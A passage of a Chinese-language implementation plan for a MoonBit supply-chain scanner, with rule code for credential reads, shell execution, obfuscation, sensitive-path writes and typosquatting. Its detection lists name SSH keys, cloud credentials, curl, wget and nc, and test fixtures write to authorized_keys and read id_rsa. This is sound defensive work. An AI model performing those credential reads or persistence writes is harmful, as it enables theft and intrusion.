  let fs = @source.S01(mkctx("let x = @http.get(\"https://api.github.com\")"))
  for f in fs {
    inspect(f.severity.rank() < @engine.High.rank(), content="true")
  }
}
```

`source/rules_credential.mbt`（S02）：

```moonbit
///|
let cred_patterns : Array[String] = [
  ".ssh", "id_rsa", "id_ed25519", ".aws", "credentials", ".npmrc", ".netrc",
  "authorized_keys", "keystore", "keychain", ".git-credentials", "wallet.dat",
]

///|
let read_indicators : Array[String] = [
  "read_file", "read_dir", "read_file_to_string", "@fs.open", "File::open", "read_to_string",
]

///|
pub fn S02(ctx : SourceCtx) -> Array[@engine.Finding] {
  let ac = @matchers.Automaton::new(cred_patterns)
  let hits = ac.scan(ctx.content)
  if hits.length() == 0 {
    return []
  }
  let has_read = read_indicators.iter().any(p => ctx.content.contains(p))
  let sev = if has_read { @engine.High } else { @engine.Low }
  findings_for(ctx, "S02", severity=sev, hits, if has_read { "credential path read" } else { "credential path reference" })
}
```

（`Automaton::new` 每文件重建有开销；实现时可将 automaton 提为包级不可变 `let` 常量（带类型注解）。）

`source/rules_exec.mbt`（S03）：

```moonbit
///|
let exec_indicators : Array[String] = ["@shell.Cmd", "@shell.Pipeline", "spawn(", "system(", "popen("]

///|
let dangerous_args : Array[String] = ["curl", "wget", "bash", "sh -c", "python", "nc ", "eval"]

///|
pub fn S03(ctx : SourceCtx) -> Array[@engine.Finding] {
  let ac = @matchers.Automaton::new(exec_indicators)
  let hits = ac.scan(ctx.content)
  if hits.length() == 0 {
    return []
  }
  let danger = dangerous_args.iter().any(p => ctx.content.contains(p))
  let sev = if danger { @engine.Critical } else { @engine.Medium }
  findings_for(ctx, "S03", severity=sev, hits, if danger { "process execution with dangerous argument" } else { "process execution" })
}
```

`source/rules_obfuscation.mbt`（S04）：

```moonbit
///|
let decode_calls : Array[String] = ["from_base64", "decode_base64", "base64::decode", "atob", "hex::decode"]

///|
pub fn S04(ctx : SourceCtx) -> Array[@engine.Finding] {
  let fs : Array[@engine.Finding] = []
  let b64 = @matchers.longest_run(ctx.content, @matchers.is_b64)
  let hex = @matchers.longest_run(ctx.content, @matchers.is_hex)
  let rd_hi : @engine.RuleDef = { id: "S04", severity: @engine.High, category: @engine.Source, description: "encoded blob" }
  let rd_md : @engine.RuleDef = { id: "S04", severity: @engine.Medium, category: @engine.Source, description: "decode call" }
  if b64 > 80 {
    fs.push(rd_hi.finding(file=ctx.file, line=1, snippet="<long base64 run>", message="base64 blob length \{b64}"))
  }
  if hex >= 64 {
    fs.push(rd_hi.finding(file=ctx.file, line=1, snippet="<long hex run>", message="hex blob length \{hex}"))
  }
  for p in decode_calls {
    match ctx.content.find(p) {
      Some(off) => {
        let line = ctx.lines.line_of(off)
        fs.push(rd_md.finding(file=ctx.file, line, snippet=ctx.lines.snippet(ctx.content, line), message="decoding call \"\{p}\""))
      }
      None => ()
    }
  }
  fs
}
```

`source/rules_ffi.mbt`（S05）：

```moonbit
///|
let ffi_danger : Array[String] = ["dlopen", "dlsym", "system(", "popen(", "execve", "LoadLibrary"]

///|
pub fn S05(ctx : SourceCtx) -> Array[@engine.Finding] {
  let fs : Array[@engine.Finding] = []
  let rd_md : @engine.RuleDef = { id: "S05", severity: @engine.Medium, category: @engine.Source, description: "extern declaration" }
  let rd_cr : @engine.RuleDef = { id: "S05", severity: @engine.Critical, category: @engine.Source, description: "dynamic code loading" }
  // extern "C" / extern "wasm" 声明：行级扫描
  let mut off = 0
  for line_view in ctx.content.split("\n") {
    let line = line_view.to_string()
    if line.contains("extern") {
      fs.push(rd_md.finding(file=ctx.file, line=ctx.lines.line_of(off), snippet=line, message="FFI extern declaration"))
    }
    off = off + line.length() + 1
  }
  for p in ffi_danger {
    match ctx.content.find(p) {
      Some(o) => {
        let line = ctx.lines.line_of(o)
        fs.push(rd_cr.finding(file=ctx.file, line, snippet=ctx.lines.snippet(ctx.content, line), message="dynamic loading/exec symbol \"\{p}\""))
      }
      None => ()
    }
  }
  fs
}
```

`source/rules.mbt`（注册表）：

```moonbit
///|
pub fn all_source_rules() -> Array[(String, (SourceCtx) -> Array[@engine.Finding])] {
  [("S01", S01), ("S02", S02), ("S03", S03), ("S04", S04), ("S05", S05)]
}
```

`source/moon.pkg`：
```
import {
  "audit/mooncake-audit/engine" @engine,
  "audit/mooncake-audit/engine/matchers" @matchers,
}
```

- [ ] **Step 4: 运行测试通过**

Run: `moon test source 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: source rules S01-S05 (network/credential/exec/obfuscation/ffi)"
```

---

### Task 7: source rules S06–S08 + S01 组合升级 + 文件分类

**Files:**
- Create: `source/rules_write.mbt`（S07, S08）
- Create: `source/scan.mbt`（文件分类、S01/S02/S04 组合升级、注册表收口）
- Modify: `source/rules.mbt`
- Modify: `metadata/`（S06 落在 metadata：见 Interfaces）
- Test: `source/scan_test.mbt`, `source/rules_write_test.mbt`

**Interfaces:**
- Produces:
  - `fn S07(ctx : SourceCtx) -> Array[@engine.Finding]`（env 嗅探：同文件敏感键 distinct ≥2 → Medium，≥4 → High）
  - `fn S08(ctx : SourceCtx) -> Array[@engine.Finding]`（写调用 + 敏感目标：Critical）
  - `fn combine_rules(fs : Array[@engine.Finding]) -> Array[@engine.Finding]`（S01 与 S02/S04 同文件同现 → 追加 Critical 组合 finding）
  - `fn is_source_file(name : String) -> Bool`（`.mbt/.mbtx/.mbt.md` 结尾）
  - metadata 包新增：`fn S06(pkg : PkgInfo, pkgfile : String) -> Array[@engine.Finding]`（pre-build 非空 → High；command 含 curl/wget/http/sh/rm → Critical）
- Consumes: `@engine`, `@matchers`, metadata `PkgInfo`。

- [ ] **Step 1: 写失败测试**

`source/scan_test.mbt`:
```moonbit
///|
test "combine escalates exfil combo" {
  let f1 : @engine.Finding = { rule: "S01", severity: @engine.High, category: @engine.Source, file: "a.mbt", line: 1, snippet: "", message: "" }
  let f2 : @engine.Finding = { ..f1, rule: "S04" }
  let out = @source.combine_rules([f1, f2])
  inspect(out.length(), content="3")
  inspect(out[2].severity, content="@engine.Critical")
  inspect(out[2].message.contains("S01"), content="true")
}

///|
test "source file classification" {
  inspect(@source.is_source_file("a.mbt"), content="true")
  inspect(@source.is_source_file("a.mbtx"), content="true")
  inspect(@source.is_source_file("a.mbt.md"), content="true")
  inspect(@source.is_source_file("a.txt"), content="false")
  inspect(@source.is_source_file("moon.pkg"), content="false")
}
```

`source/rules_write_test.mbt`:
```moonbit
///|
test "S07 env sniffing threshold" {
  let two = "let a = @env.get_env_var(\"API_KEY\")\nlet b = @env.get_env_var(\"SECRET\")"
  let fs = @source.S07(@source.mkctx_for_test(two))
  inspect(fs[0].severity, content="@engine.Medium")
  let four = "let a = @env.get_env_var(\"API_KEY\")\nlet b = @env.get_env_var(\"SECRET\")\nlet c = @env.get_env_var(\"TOKEN\")\nlet d = @env.get_env_var(\"PASSWORD\")"
  let fs4 = @source.S07(@source.mkctx_for_test(four))
  inspect(fs4[0].severity, content="@engine.High")
}

///|
test "S08 ssh write is critical" {
  let code = "@fs.write_string_to_file(\"/root/.ssh/authorized_keys\", my_key)"
  let fs = @source.S08(@source.mkctx_for_test(code))
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.Critical")
}
```

（`mkctx_for_test` 为测试辅助，实现于 `source/scan.mbt` 或测试文件内；测试文件与包同目录时可直接构造 SourceCtx。）

- [ ] **Step 2: 运行确认失败**

Run: `moon test source 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现**

`source/rules_write.mbt`:
```moonbit
///|
let env_sensitive : Array[String] = ["KEY", "TOKEN", "SECRET", "PASS", "CRED", "AUTH", "PRIVATE"]

///|
let env_calls : Array[String] = ["get_env_var", "get_env", "process.env", "environ"]

///|
pub fn S07(ctx : SourceCtx) -> Array[@engine.Finding] {
  let has_env = env_calls.iter().any(p => ctx.content.contains(p))
  if !has_env {
    return []
  }
  let up = ctx.content.to_upper()
  let mut distinct = 0
  for kw in env_sensitive {
    if up.contains(kw) {
      distinct = distinct + 1
    }
  }
  if distinct < 2 {
    return []
  }
  let sev = if distinct >= 4 { @engine.High } else { @engine.Medium }
  let rd : @engine.RuleDef = { id: "S07", severity: sev, category: @engine.Source, description: "env sniffing" }
  [rd.finding(file=ctx.file, line=1, snippet="", message="reads \{distinct} sensitive env keyword classes")]
}

///|
let write_calls : Array[String] = ["write_file", "write_string_to_file", "write_bytes_to_file", "open("]

///|
let write_targets : Array[String] = [
  "authorized_keys", ".ssh/", ".bashrc", ".zshrc", ".profile", "crontab", ".gitconfig", "ld.so.preload",
]

///|
pub fn S08(ctx : SourceCtx) -> Array[@engine.Finding] {
  let has_write = write_calls.iter().any(p => ctx.content.contains(p))
  if !has_write {
    return []
  }
  let ac = @matchers.Automaton::new(write_targets)
  let hits = ac.scan(ctx.content)
  if hits.length() == 0 {
    return []
  }
  findings_for(ctx, "S08", severity=@engine.Critical, hits, "write to sensitive system path")
}
```

`source/scan.mbt`:
```moonbit
///|
pub fn is_source_file(name : String) -> Bool {
  name.ends_with(".mbt") || name.ends_with(".mbtx") || name.ends_with(".mbt.md")
}

///|
pub fn combine_rules(fs : Array[@engine.Finding]) -> Array[@engine.Finding] {
  let out = Array::from_array(fs)
  let has = (rule : String, file : String) => fs.iter().any(f => f.rule == rule && f.file == file)
  let files : Array[String] = []
  for f in fs {
    if !(files.iter().any(x => x == f.file)) {
      files.push(f.file)
    }
  }
  for file in files {
    if has("S01", file) && (has("S02", file) || has("S04", file)) {
      let rd : @engine.RuleDef = { id: "S99", severity: @engine.Critical, category: @engine.Source, description: "exfil combo" }
      out.push(rd.finding(file=file, line=1, snippet="", message="S01 network + credential/obfuscation in same file"))
    }
  }
  out
}
```

`metadata/rules.mbt`（S06）：
```moonbit
///|
let prebuild_danger : Array[String] = ["curl", "wget", "http", "sh", "python", "rm -rf"]

///|
pub fn S06(pkg : PkgInfo, pkgfile : String) -> Array[@engine.Finding] {
  let fs : Array[@engine.Finding] = []
  for cmd in pkg.pre_build {
    let danger = prebuild_danger.iter().any(p => cmd.contains(p))
    let rd : @engine.RuleDef = { id: "S06", severity: if danger { @engine.Critical } else { @engine.High }, category: @engine.Source, description: "pre-build hook" }
    fs.push(rd.finding(file=pkgfile, line=1, snippet=cmd, message="pre-build command"))
  }
  fs
}
```

并把 `all_source_rules()` 追加为 `[.., ("S07", S07), ("S08", S08)]`（组合规则 S99 在 combine 阶段生成，不注册）。

- [ ] **Step 4: 运行测试通过**

Run: `moon test source metadata 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: source rules S06-S08, exfil combo escalation, file classification"
```

---

### Task 8: metadata rules M01–M05

**Files:**
- Create: `metadata/rules.mbt`（追加 M 规则，与 S06 同文件或新建 `metadata/rules_meta.mbt`）
- Test: `metadata/rules_meta_test.mbt`

**Interfaces:**
- Consumes: `Manifest`、`@matchers.damerau_levenshtein`
- Produces:
  - `fn M01(m : Manifest, hotlist : Array[String]) -> Array[@engine.Finding]`（repo 名与 hotlist 中 repo 名 DL ≤2 且不同名 → High；hotlist 元素为 "author/repo"）
  - `fn M02(m : Manifest) -> Array[@engine.Finding]`（author ≠ moonbitlang 但 repo ∈ 官方名集 {core,async,x,parser,yacc,quickcheck} 或 name 以 `moonbitlang/` 开头 → Critical）
  - `fn M03(m : Manifest, readme_len : Int, has_tests : Bool) -> Array[@engine.Finding]`（readme_len < 200 且 !has_tests 且 description 非空 → Medium）
  - `fn M04(m : Manifest) -> Array[@engine.Finding]`（repository 为空 → Low；repository 的 owner 段与模块 author 不一致 → Medium）
  - `fn M05(m : Manifest, hotlist : Array[String]) -> Array[@engine.Finding]`（依赖 repo 名与 hotlist/官方名 DL ≤2 → High）
  - `fn official_repo_names() -> Array[String]`

- [ ] **Step 1: 写失败测试** `metadata/rules_meta_test.mbt`

```moonbit
///|
fn manifest(name : String, repo : String, deps : Array[String]) -> @metadata.Manifest {
  { name, version: "0.1.0", repository: repo, readme: "README.md", deps }
}

///|
test "M02 impersonation of official" {
  let fs = @metadata.M02(manifest("evil/core", "https://github.com/evil/core", []))
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.Critical")
  inspect(@metadata.M02(manifest("moonbitlang/core", "https://github.com/moonbitlang/core", [])).length(), content="0")
}

///|
test "M01 typosquat" {
  let hot = ["moonbitlang/async", "moonbitlang/core", "rxml/moonbit-xml"]
  let fs = @metadata.M01(manifest("evil/asynx", "https://github.com/evil/asynx", []), hot)
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.High")
  inspect(@metadata.M01(manifest("moonbitlang/async", "https://github.com/moonbitlang/async", []), hot).length(), content="0")
}

///|
test "M03 empty shell" {
  let fs = @metadata.M03(manifest("a/great-lib", "https://github.com/a/great-lib", []), 50, false)
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.Medium")
  inspect(@metadata.M03(manifest("a/great-lib", "https://github.com/a/great-lib", []), 5000, true).length(), content="0")
}

///|
test "M04 repo owner mismatch" {
  let fs = @metadata.M04(manifest("author1/lib", "https://github.com/otherowner/lib", []))
  inspect(fs[0].severity, content="@engine.Medium")
  inspect(@metadata.M04(manifest("a/lib", "", [])).length(), content="1") // 空 repo → Low
}

///|
test "M05 dependency confusion" {
  let hot = ["moonbitlang/async", "bobzhang/toml"]
  let fs = @metadata.M05(manifest("a/lib", "https://github.com/a/lib", ["bobzhang/tonml"]), hot)
  inspect(fs.length(), content="1")
  inspect(fs[0].severity, content="@engine.High")
}
```

- [ ] **Step 2: 运行确认失败**

Run: `moon test metadata 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现** `metadata/rules_meta.mbt`

```moonbit
///|
pub fn official_repo_names() -> Array[String] {
  ["core", "async", "x", "parser", "yacc", "quickcheck"]
}

///|
fn repo_of(name : String) -> String {
  match name.find("/") {
    Some(i) => try! name[i + 1:].to_string()
    None => name
  }
}

///|
fn author_of(name : String) -> String {
  match name.find("/") {
    Some(i) => try! name[:i].to_string()
    None => ""
  }
}

///|
fn repo_of_url(url : String) -> String {
  let t = url.trim("/").to_string()
  match t.find("://") {
    Some(p) => {
      let rest = try! t[p + 3:].to_string()
      let segs = rest.split("/").collect()
      if segs.length() >= 2 {
        try! segs[segs.length() - 1].to_string()
      } else {
        ""
      }
    }
    None => ""
  }
}

///|
fn owner_of_url(url : String) -> String {
  let t = url.trim("/").to_string()
  match t.find("://") {
    Some(p) => {
      let rest = try! t[p + 3:].to_string()
      let segs = rest.split("/").collect()
      if segs.length() >= 2 {
        try! segs[segs.length() - 2].to_string()
      } else {
        ""
      }
    }
    None => ""
  }
}

///|
pub fn M01(m : Manifest, hotlist : Array[String]) -> Array[@engine.Finding] {
  let rd : @engine.RuleDef = { id: "M01", severity: @engine.High, category: @engine.Metadata, description: "typosquatting" }
  let repo = repo_of(m.name)
  let mut out = false
  let fs : Array[@engine.Finding] = []
  for hot in hotlist {
    let hrepo = repo_of(hot)
    if hrepo == repo {
      continue
    }
    if @matchers.damerau_levenshtein(repo, hrepo) <= 2 {
      out = true
      fs.push(rd.finding(file="moon.mod", line=1, snippet=m.name, message="name similar to popular module \{hot}"))
      break
    }
  }
  if !out {
    // no finding
  }
  fs
}

///|
pub fn M02(m : Manifest) -> Array[@engine.Finding] {
  let rd : @engine.RuleDef = { id: "M02", severity: @engine.Critical, category: @engine.Metadata, description: "official impersonation" }
  let author = author_of(m.name)
  let repo = repo_of(m.name)
  if author == "moonbitlang" {
    return []
  }
  if m.name.starts_with("moonbitlang/") || official_repo_names().iter().any(o => o == repo) {
    [rd.finding(file="moon.mod", line=1, snippet=m.name, message="impersonates official moonbitlang module")]
  } else {
    []
  }
}

///|
pub fn M03(m : Manifest, readme_len : Int, has_tests : Bool) -> Array[@engine.Finding] {
  if readme_len < 200 && !has_tests && m.name is not "" {
    let rd : @engine.RuleDef = { id: "M03", severity: @engine.Medium, category: @engine.Metadata, description: "empty shell" }
    [rd.finding(file="moon.mod", line=1, snippet=m.name, message="no substantial readme and no tests")]
  } else {
    []
  }
}

///|
pub fn M04(m : Manifest) -> Array[@engine.Finding] {
  if m.repository is "" {
    let rd : @engine.RuleDef = { id: "M04", severity: @engine.Low, category: @engine.Metadata, description: "missing repository" }
    return [rd.finding(file="moon.mod", line=1, snippet="", message="no repository field")]
  }
  let owner = owner_of_url(m.repository)
  let author = author_of(m.name)
  if owner is not "" && author is not "" && owner != author {
    let rd : @engine.RuleDef = { id: "M04", severity: @engine.Medium, category: @engine.Metadata, description: "repository owner mismatch" }
    [rd.finding(file="moon.mod", line=1, snippet=m.repository, message="repository owner \{owner} != module author \{author}")]
  } else {
    []
  }
}

///|
pub fn M05(m : Manifest, hotlist : Array[String]) -> Array[@engine.Finding] {
  let rd : @engine.RuleDef = { id: "M05", severity: @engine.High, category: @engine.Metadata, description: "dependency confusion" }
  let fs : Array[@engine.Finding] = []
  for dep in m.deps {
    let drepo = repo_of(dep)
    let near_hot = hotlist.iter().any(h => {
      let hrepo = repo_of(h)
      hrepo != drepo && @matchers.damerau_levenshtein(drepo, hrepo) <= 2
    })
    let near_official = official_repo_names().iter().any(o => o != drepo && @matchers.damerau_levenshtein(drepo, o) <= 2)
    if near_hot || near_official {
      fs.push(rd.finding(file="moon.mod", line=1, snippet=dep, message="dependency name close to known module"))
    }
  }
  fs
}
```

（`is not ""` 语法为字符串模式匹配；若编译器不接受 `m.name is not ""`，改写为 `m.name.length() > 0`。`ref`/闭包细节以 `moon check` 为准。）

- [ ] **Step 4: 运行测试通过**

Run: `moon test metadata 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: metadata rules M01-M05 (typosquat/impersonation/shell/mismatch/confusion)"
```

---

### Task 9: score + report

**Files:**
- Create: `score/score.mbt`
- Create: `report/report.mbt`
- Modify: 两个包的 `moon.pkg`（engine 导入）
- Test: `score/score_test.mbt`, `report/report_test.mbt`

**Interfaces:**
- Produces:
  - `fn risk_of(findings : Array[@engine.Finding]) -> Int`（按 rule 取最大 severity 权重求和，cap 100）
  - `enum Verdict { Clean; Suspicious; Malicious }` + `fn verdict_of(risk : Int) -> Verdict`（≥50 Malicious，≥15 Suspicious）+ `Verdict::to_string()`
  - `struct Report { module : String, version : String, risk : Int, verdict : String, findings : Array[@engine.Finding], errors : Array[String] }` derive(ToJson)；`Report::to_json_string(self) -> String`（`to_json().stringify()`）
  - `fn human_summary(r : Report) -> String`（终端文本）

- [ ] **Step 1: 写失败测试** `score/score_test.mbt`

```moonbit
///|
fn f(rule : String, sev : @engine.Severity) -> @engine.Finding {
  { rule, severity: sev, category: @engine.Source, file: "a.mbt", line: 1, snippet: "", message: "" }
}

///|
test "risk aggregates per rule max" {
  let fs = [f("S02", @engine.High), f("S02", @engine.High), f("S04", @engine.Medium)]
  inspect(@score.risk_of(fs), content="15")
}

///|
test "risk caps at 100" {
  let fs : Array[@engine.Finding] = []
  for i in 0..<10 {
    fs.push(f("S0\{i}", @engine.Critical))
  }
  inspect(@score.risk_of(fs), content="100")
}

///|
test "verdict thresholds" {
  inspect(@score.verdict_of(0).to_string(), content="Clean")
  inspect(@score.verdict_of(14).to_string(), content="Clean")
  inspect(@score.verdict_of(15).to_string(), content="Suspicious")
  inspect(@score.verdict_of(50).to_string(), content="Malicious")
}
```

- [ ] **Step 2: 运行确认失败**

Run: `moon test score 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现**

`score/score.mbt`:
```moonbit
///|
pub(all) enum Verdict {
  Clean
  Suspicious
  Malicious
} derive(Eq, Debug)

///|
pub fn Verdict::to_string(self : Verdict) -> String {
  match self {
    Clean => "Clean"
    Suspicious => "Suspicious"
    Malicious => "Malicious"
  }
}

///|
pub fn verdict_of(risk : Int) -> Verdict {
  if risk >= 50 {
    Malicious
  } else if risk >= 15 {
    Suspicious
  } else {
    Clean
  }
}

///|
pub fn risk_of(findings : Array[@engine.Finding]) -> Int {
  let per_rule : Map[String, @engine.Severity] = Map([])
  for f in findings {
    match per_rule.get(f.rule) {
      Some(s) =>
        if f.severity.rank() > s.rank() {
          per_rule[f.rule] = f.severity
        }
      None => per_rule[f.rule] = f.severity
    }
  }
  let mut total = 0
  for _, sev in per_rule {
    total += sev.weight()
  }
  if total > 100 {
    100
  } else {
    total
  }
}
```

`report/report.mbt`:
```moonbit
///|
pub(all) struct Report {
  module : String
  version : String
  risk : Int
  verdict : String
  findings : Array[@engine.Finding]
  errors : Array[String]
} derive(Debug, ToJson)

///|
pub fn Report::to_json_string(self : Report) -> String {
  self.to_json().stringify()
}

///|
pub fn human_summary(r : Report) -> String {
  let sb = StringBuilder()
  sb <+ "module: \{r.module}@\{r.version}\n"
  sb <+ "risk: \{r.risk} verdict: \{r.verdict}\n"
  sb <+ "findings: \{r.findings.length()} errors: \{r.errors.length()}\n"
  for f in r.findings {
    sb <+ "  [\{f.rule}/\{f.severity.label()}] \{f.file}:\{f.line} \{f.message}\n"
  }
  sb.to_string()
}
```

`report/moon.pkg`：`import { "audit/mooncake-audit/engine" @engine, "moonbitlang/core/json" }`（derive ToJson 需要核 json 包是否须显式导入，以 moon check 为准）。`score/moon.pkg` 同理导入 engine。

`report/report_test.mbt`:
```moonbit
///|
test "report json round shape" {
  let r : @report.Report = {
    module: "a/b",
    version: "0.1.0",
    risk: 10,
    verdict: "Suspicious",
    findings: [],
    errors: [],
  }
  let j = @json.parse(r.to_json_string())
  inspect(j["module"].unwrap().string().unwrap(), content="a/b")
  inspect(j["risk"].unwrap().number().unwrap(), content="10")
}
```

- [ ] **Step 4: 运行测试通过**

Run: `moon test score report 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: risk scoring and JSON/human reports"
```

---

### Task 10: engine 管线 run_scan（目录遍历 + 规则调度）

**Files:**
- Create: `engine/scan.mbt`
- Modify: `engine/moon.pkg`
- Test: `engine/scan_test.mbt`

**Interfaces:**
- Consumes: `@fs`/`@io`（async）、metadata `parse_manifest/parse_pkg/M*/S06`、source `all_source_rules/combine_rules/is_source_file`、score、report
- Produces: `struct ScanOptions { hotlist : Array[String] }`；`async fn run_scan(root : String, opts : ScanOptions) -> @report.Report raise`——walk `root`，收集：
  - manifest 文本 = `root/moon.mod`（缺失则记 error finding 并以目录名兜底 module）
  - readme 长度 = `root/README*` 最大者 `text().length()`；has_tests = 存在 `*_test.mbt`/`*_wbtest.mbt`
  - 每个 `moon.pkg`/`moon.pkg.json` → S06
  - 每个 source 文件 → SourceCtx → 全部 source 规则
  - 错误（读文件失败等）→ errors 数组，单文件失败继续

- [ ] **Step 1: 写失败测试** `engine/scan_test.mbt`

```moonbit
///|
async test "run_scan over temp malicious dir" {
  let dir = @fs.tmpdir(prefix="scan-test-")
  @fs.mkdir(dir + "/src", recursive=true)
  @fs.write_string_to_file(dir + "/moon.mod", "name = \"evil/asynx\"\nversion = \"0.1.0\"\n")
  @fs.write_string_to_file(dir + "/src/a.mbt", "let p = \"/home/u/.ssh/id_rsa\"\nlet c = @fs.read_file_to_string(p)")
  let r = @engine.run_scan(dir, { hotlist: ["moonbitlang/async", "moonbitlang/core"] })
  inspect(r.module, content="evil/asynx")
  // M01(10) + S02(10) = 20 → Suspicious
  inspect(r.verdict, content="Suspicious")
  let rules = r.findings.map(f => f.rule).sort()
  inspect(rules.contains("M01") && rules.contains("S02"), content="true")
}
```

（`@fs.write_string_to_file` 在 async/fs 0.20.4 中对应 `@fs.write_file(path, data)` + `String` 实现 `@io.Data`——以 `moon ide doc "@fs"` 为准校正 API 名；tmpdir 前缀参数 `prefix~`。）

- [ ] **Step 2: 运行确认失败**

Run: `moon test engine 2>&1 | tail -3`
Expected: 编译错误

- [ ] **Step 3: 实现** `engine/scan.mbt`

```moonbit
///|
pub(all) struct ScanOptions {
  hotlist : Array[String]
} derive(Debug)

///|
fn basename(p : String) -> String {
  match p.find_last("/") {
    Some(i) => try! p[i + 1:].to_string()
    None => p
  }
}

///|
fn rel(base : String, p : String) -> String {
  if p.length() > base.length() {
    try! p[base.length() + 1:].to_string()
  } else {
    p
  }
}

///|
async fn walk_files(dir : String, acc : Array[String]) -> Unit {
  for name in @fs.readdir(dir) {
    let p = dir + "/" + name
    if @fs.kind(p) is Directory {
      walk_files(p, acc)
    } else {
      acc.push(p)
    }
  }
}

///|
async fn read_opt(path : String) -> String? {
  try {
    Some(@fs.read_file(path).text())
  } catch {
    _ => None
  }
}

///|
pub async fn run_scan(root : String, opts : ScanOptions) -> @report.Report raise {
  let errors : Array[String] = []
  let findings : Array[@engine.Finding] = []
  // manifest
  let mtext = match read_opt(root + "/moon.mod") {
    Some(t) => t
    None => ""
  }
  let manifest = @metadata.parse_manifest(mtext)
  let manifest = match manifest {
    Some(m) => Some(m)
    None => match @metadata.parse_manifest_json(mtext) {
      Some(m) => Some(m)
      None => {
        errors.push("cannot parse moon.mod")
        None
      }
    }
  }
  let module_name = match manifest {
    Some(m) => m.name
    None => basename(root)
  }
  let version = match manifest {
    Some(m) => m.version
    None => ""
  }
  // 遍历文件
  let files : Array[String] = []
  walk_files(root, files)
  let mut readme_len = 0
  let mut has_tests = false
  for p in files {
    let name = basename(p)
    if name.starts_with("README") {
      match read_opt(p) {
        Some(t) =>
          if t.length() > readme_len {
            readme_len = t.length()
          }
        None => ()
      }
    }
    if name.ends_with("_test.mbt") || name.ends_with("_wbtest.mbt") {
      has_tests = true
    }
  }
  // metadata 规则
  match manifest {
    Some(m) => {
      for f in @metadata.M01(m, opts.hotlist) {
        findings.push({ ..f, file: "moon.mod" })
      }
      for f in @metadata.M02(m) {
        findings.push({ ..f, file: "moon.mod" })
      }
      for f in @metadata.M03(m, readme_len, has_tests) {
        findings.push({ ..f, file: "moon.mod" })
      }
      for f in @metadata.M04(m) {
        findings.push({ ..f, file: "moon.mod" })
      }
      for f in @metadata.M05(m, opts.hotlist) {
        findings.push({ ..f, file: "moon.mod" })
      }
    }
    None => ()
  }
  // pkg 文件 → S06；source 文件 → 规则
  let rules = @source.all_source_rules()
  for p in files {
    let name = basename(p)
    let relp = rel(root, p)
    if name is "moon.pkg" || name is "moon.pkg.json" {
      match read_opt(p) {
        Some(t) =>
          for f in @metadata.S06(@metadata.parse_pkg(t), relp) {
            findings.push(f)
          }
        None => ()
      }
    } else if @source.is_source_file(name) {
      match read_opt(p) {
        Some(content) => {
          let ctx : @source.SourceCtx = { file: relp, content, lines: @matchers.LineIndex::build(content) }
          for _, rulefn in rules {
            for f in rulefn(ctx) {
              findings.push(f)
            }
          }
        }
        None => errors.push("cannot read \{relp}")
      }
    }
  }
  let combined = @source.combine_rules(findings)
  let risk = @score.risk_of(combined)
  {
    module: module_name,
    version,
    risk,
    verdict: @score.verdict_of(risk).to_string(),
    findings: combined,
    errors,
  }
}
```

（MoonBit 无 `await` 关键字：async 调用直接书写；`match read_opt(p) { ... }` 在 async 函数体内合法。`{ ..f, file: "moon.mod" }` 为记录更新语法。`find_last` 若不存在用 `String::rev_find` 替代——以 `moon ide doc "String::*find*"` 为准。）

- [ ] **Step 4: 运行测试通过**

Run: `moon test engine 2>&1 | tail -3`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: run_scan pipeline (walk, metadata+source dispatch, scoring)"
```

---

### Task 11: cmd/main CLI

**Files:**
- Modify: `cmd/main/main.mbt`, `cmd/main/moon.pkg`
- Test: `cmd/main/cli_test.mbt`（参数解析纯函数测试）

**Interfaces:**
- Consumes: `@engine.run_scan`, `@report`
- Produces: CLI `mooncake-audit scan <dir> [--module m] [--version v] [--hotlist file] [--json] [--min-severity sev]`
  - 默认输出 human summary；`--json` 输出单行 JSON
  - `--min-severity` 过滤 findings（rank ≥ 给定值）
  - 退出码不做区分（v1 恒为 0；Python runner 以 JSON 解析成功与否判定成败）

- [ ] **Step 1: 写失败测试** `cmd/main/cli_test.mbt`

```moonbit
///|
test "arg parse" {
  let c = @main.parse_args(["scan", "/tmp/x", "--json", "--hotlist", "h.txt"])
  inspect(c.cmd, content="Scan")
  inspect(c.dir, content="/tmp/x")
  inspect(c.json, content="true")
  inspect(c.hotlist, content="h.txt")
}
```

- [ ] **Step 2: 运行确认失败** → **Step 3: 实现** `cmd/main/main.mbt`

```moonbit
///|
pub(all) enum Cmd {
  Scan(dir~ : String, module~ : String, version~ : String, hotlist~ : String, json~ : Bool, min_sev~ : Int)
  Help
} derive(Debug)

///|
pub fn parse_args(args : Array[String]) -> Cmd {
  let mut dir = ""
  let mut module = ""
  let mut version = ""
  let mut hotlist = ""
  let mut json = false
  let mut min_sev = 0
  let mut i = 1
  let n = args.length()
  if n == 0 || args[0] != "scan" {
    return Help
  }
  for ; i < n; i = i + 1 {
    let a = args[i]
    if a == "--json" {
      json = true
    } else if a == "--module" && i + 1 < n {
      i += 1
      module = args[i]
    } else if a == "--version" && i + 1 < n {
      i += 1
      version = args[i]
    } else if a == "--hotlist" && i + 1 < n {
      i += 1
      hotlist = args[i]
    } else if a == "--min-severity" && i + 1 < n {
      i += 1
      min_sev = match @engine.parse_severity(args[i]) {
        Some(s) => s.rank()
        None => 0
      }
    } else if dir is "" {
      dir = a
    }
  }
  Scan(dir~, module~, version~, hotlist~, json~, min_sev~)
}

///|
fn load_hotlist(path : String) -> Array[String] {
  if path is "" {
    return []
  }
  try {
    let text = @fs.read_file(path).text()
    text.split("\n").map(l => l.trim(" \t\r").to_string()).filter(l => l.length() > 0).collect()
  } catch {
    _ => []
  }
}

///|
fn filter_min(r : @report.Report, min_rank : Int) -> @report.Report {
  if min_rank <= 0 {
    return r
  }
